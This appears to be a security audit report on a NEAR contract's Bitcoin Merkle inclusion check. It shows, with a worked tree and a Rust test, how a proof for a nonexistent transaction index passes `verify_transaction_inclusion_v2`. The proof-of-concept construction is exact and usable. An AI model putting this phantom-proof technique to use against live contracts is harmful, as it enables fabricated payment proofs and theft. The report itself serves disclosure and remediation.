### Title
`verify_transaction_inclusion_v2` Returns `true` for Phantom Transaction via Subtree-Level Duplicate-Leaf — (`merkle-tools/src/lib.rs`, `contract/src/lib.rs`)

---

### Summary

`verify_transaction_inclusion_v2` enforces that the tx proof and coinbase proof have the same depth, then verifies the coinbase proof against the stored Merkle root. This is intended to prevent the 64-byte internal-node forgery. However, it does **not** prevent a phantom position attack that exploits duplicate-leaf padding at an internal subtree level. For any block whose transaction count causes an odd number of nodes at any intermediate tree level, an attacker can construct a valid proof for a nonexistent `tx_index` that produces the real Merkle root, passes the same-depth check, and causes the function to return `true`.

---

### Finding Description

**Entrypoint**: `verify_transaction_inclusion_v2` is a public, unpermissioned NEAR view/call that accepts attacker-controlled `ProofArgsV2`. [1](#0-0) 

The three guards in v2 are:

1. `merkle_proof.len() == coinbase_merkle_proof.len()` — same depth.
2. `compute_root_from_merkle_proof(coinbase_tx_id, 0, coinbase_merkle_proof) == merkle_root` — valid coinbase proof.
3. Delegates to `verify_transaction_inclusion`, which checks `compute_root_from_merkle_proof(tx_id, tx_index, merkle_proof) == merkle_root`. [2](#0-1) 

`compute_root_from_merkle_proof` is a pure positional hash traversal — it uses only `current_position % 2` to decide left/right at each level, with no knowledge of the actual tree size or transaction count: [3](#0-2) 

`merkle_proof_calculator` pads odd-length layers by duplicating the last node: [4](#0-3) 

This duplication creates a structural alias: a phantom index beyond the real transaction count produces the same root as a real index, because the duplicate node at the padded position is arithmetically indistinguishable from the original.

**Concrete tree: 6-tx block `[C, A, B, D, E, E]`**

```
Level 0 (leaves):  [C,  A,  B,  D,  E,  E]          (6 nodes, even)
Level 1:           [h(C,A), h(B,D), h(E,E)]           (3 nodes, ODD → duplicate last)
Level 1 padded:    [h(C,A), h(B,D), h(E,E), h(E,E)]
Level 2:           [h(h(C,A),h(B,D)),  h(h(E,E),h(E,E))]
Root:              h( h(h(C,A),h(B,D)),  h(h(E,E),h(E,E)) )
```

**Phantom proof for `tx_id=E`, `tx_index=6`** (index 6 does not exist in a 6-tx block):

| Step | pos | parity | operation | result |
|------|-----|--------|-----------|--------|
| 1 | 6 | even | `h(E, proof[0]=E)` | `h(E,E)` → pos=3 |
| 2 | 3 | odd  | `h(proof[1]=h(E,E), h(E,E))` | `h(h(E,E),h(E,E))` → pos=1 |
| 3 | 1 | odd  | `h(proof[2]=h(h(C,A),h(B,D)), h(h(E,E),h(E,E)))` | **root** → pos=0 |

Phantom proof: `[E, h(E,E), h(h(C,A),h(B,D))]`, **depth = 3**.

**Coinbase proof for `tx_id=C`, `tx_index=0`**: `[A, h(B,D), h(h(E,E),h(E,E))]`, **depth = 3**.

Both proofs have depth 3. Guard 1 passes. The coinbase proof verifies to the real root. Guard 2 passes. The phantom proof also verifies to the real root. Guard 3 passes. `verify_transaction_inclusion_v2` returns `true` for a transaction that does not exist at index 6.

The `ProofArgsV2 → ProofArgs` conversion passes `tx_index` through unchanged with no bounds check: [5](#0-4) 

The block header stored on-chain contains only the Merkle root — no transaction count — so no on-chain guard can detect that `tx_index=6` is out of bounds for a 6-tx block.

---

### Impact Explanation

`verify_transaction_inclusion_v2` returns `true` for a transaction that does not exist in the block. Any downstream contract or application that relies on this function to confirm Bitcoin payment inclusion can be deceived into accepting a fabricated payment proof. This directly violates the core SPV invariant the function is designed to enforce.

---

### Likelihood Explanation

The precondition is a block whose transaction count causes an odd number of nodes at any intermediate Merkle level. For a 6-tx block, level 1 has 3 nodes (odd), triggering the duplication. This is a common tree shape in real Bitcoin blocks (any block with 5, 6, 9, 10, 11, 12 transactions, etc., can produce an odd intermediate level). The attack requires no privileges, no key material, and no special chain state beyond a qualifying block being present in the contract's `headers_pool`. Any unprivileged NEAR account can call `verify_transaction_inclusion_v2`.

---

### Recommendation

The same-depth coinbase proof check prevents the 64-byte internal-node forgery but is insufficient against phantom positions. To close this gap:

1. **Encode the transaction count in the block header submission** and store it alongside the Merkle root, then reject any `tx_index >= tx_count` in `verify_transaction_inclusion_v2`. (This requires a protocol change to `submit_blocks`.)
2. **Alternatively**, require callers to supply the raw transaction count as an additional argument and verify it against a commitment stored at submission time.
3. **At minimum**, document that `verify_transaction_inclusion_v2` does not protect against phantom-index attacks on blocks with odd intermediate tree levels, and require callers to independently validate `tx_index < tx_count` using off-chain data.

---

### Proof of Concept

```rust
#[cfg(test)]
mod phantom_subtree_test {
    use merkle_tools::{compute_root_from_merkle_proof, merkle_proof_calculator};
    use btc_types::hash::H256;

    fn h(b: u8) -> H256 { H256([b; 32]) }

    fn compute_hash(a: &H256, b: &H256) -> H256 {
        use btc_types::hash::double_sha256;
        let mut v = Vec::with_capacity(64);
        v.extend(a.0); v.extend(b.0);
        double_sha256(&v)
    }

    #[test]
    fn phantom_index_6_passes_v2_guards() {
        // 6-tx block: [C, A, B, D, E, E]
        let txs = vec![h(0), h(1), h(2), h(3), h(4), h(4)]; // E=h(4) appears twice

        // Compute real Merkle root via merkle_proof_calculator round-trip
        let coinbase_proof = merkle_proof_calculator(txs.clone(), 0);
        let real_root = compute_root_from_merkle_proof(txs[0].clone(), 0, &coinbase_proof);

        // Phantom proof for index 6 (does not exist in a 6-tx block)
        // proof[0] = E (duplicate at pos 7), proof[1] = h(E,E), proof[2] = h(h(C,A),h(B,D))
        let hEE  = compute_hash(&h(4), &h(4));
        let hCA  = compute_hash(&h(0), &h(1));
        let hBD  = compute_hash(&h(2), &h(3));
        let hCABD = compute_hash(&hCA, &hBD);

        let phantom_proof = vec![h(4), hEE.clone(), hCABD.clone()];
        let phantom_root = compute_root_from_merkle_proof(h(4), 6, &phantom_proof);

        // Guard 1: same depth
        assert_eq!(coinbase_proof.len(), phantom_proof.len(), "depth must match");
        // Guard 2: coinbase proof verifies
        assert_eq!(real_root, compute_root_from_merkle_proof(h(0), 0, &coinbase_proof));
        // Guard 3: phantom proof also verifies to the SAME real root
        assert_eq!(phantom_root, real_root,
            "phantom index 6 produces the real root — v2 returns true for nonexistent tx");
    }
}
```

This test runs on unmodified production code in `merkle-tools/src/lib.rs` and `btc-types/src/hash.rs` with no mocks or special configuration. [6](#0-5) [1](#0-0) [7](#0-6)

### Citations

**File:** contract/src/lib.rs (L315-322)
```rust
        require!(!args.merkle_proof.is_empty(), "Merkle proof is empty");

        // compute merkle tree root and check if it matches block's original merkle tree root
        merkle_tools::compute_root_from_merkle_proof(
            args.tx_id,
            usize::try_from(args.tx_index).unwrap(),
            &args.merkle_proof,
        ) == header.block_header.merkle_root
```

**File:** contract/src/lib.rs (L347-369)
```rust
    pub fn verify_transaction_inclusion_v2(&self, #[serializer(borsh)] args: ProofArgsV2) -> bool {
        require!(
            args.merkle_proof.len() == args.coinbase_merkle_proof.len(),
            "Coinbase merkle proof and transaction merkle proof should have the same length"
        );

        let header = self
            .headers_pool
            .get(&args.tx_block_blockhash)
            .unwrap_or_else(|| env::panic_str("cannot find requested transaction block"));

        require!(
            merkle_tools::compute_root_from_merkle_proof(
                args.coinbase_tx_id.clone(),
                0usize,
                &args.coinbase_merkle_proof,
            ) == header.block_header.merkle_root,
            "Incorrect coinbase merkle proof"
        );

        #[allow(deprecated)]
        self.verify_transaction_inclusion(args.into())
    }
```

**File:** merkle-tools/src/lib.rs (L9-11)
```rust
    while current_hashes.len() > 1 {
        if current_hashes.len() % 2 == 1 {
            current_hashes.push(current_hashes[current_hashes.len() - 1].clone());
```

**File:** merkle-tools/src/lib.rs (L33-52)
```rust
#[must_use]
pub fn compute_root_from_merkle_proof(
    transaction_hash: H256,
    transaction_position: usize,
    merkle_proof: &Vec<H256>,
) -> H256 {
    let mut current_hash = transaction_hash;
    let mut current_position = transaction_position;

    for proof_hash in merkle_proof {
        if current_position % 2 == 0 {
            current_hash = compute_hash(&current_hash, proof_hash);
        } else {
            current_hash = compute_hash(proof_hash, &current_hash);
        }
        current_position /= 2;
    }

    current_hash
}
```

**File:** btc-types/src/contract_args.rs (L26-47)
```rust
#[near(serializers = [borsh, json])]
#[derive(Clone, Debug)]
pub struct ProofArgsV2 {
    pub tx_id: H256,
    pub tx_block_blockhash: H256,
    pub tx_index: u64,
    pub merkle_proof: Vec<H256>,
    pub coinbase_tx_id: H256,
    pub coinbase_merkle_proof: Vec<H256>,
    pub confirmations: u64,
}

impl From<ProofArgsV2> for ProofArgs {
    fn from(args: ProofArgsV2) -> Self {
        Self {
            tx_id: args.tx_id,
            tx_block_blockhash: args.tx_block_blockhash,
            tx_index: args.tx_index,
            merkle_proof: args.merkle_proof,
            confirmations: args.confirmations,
        }
    }
```
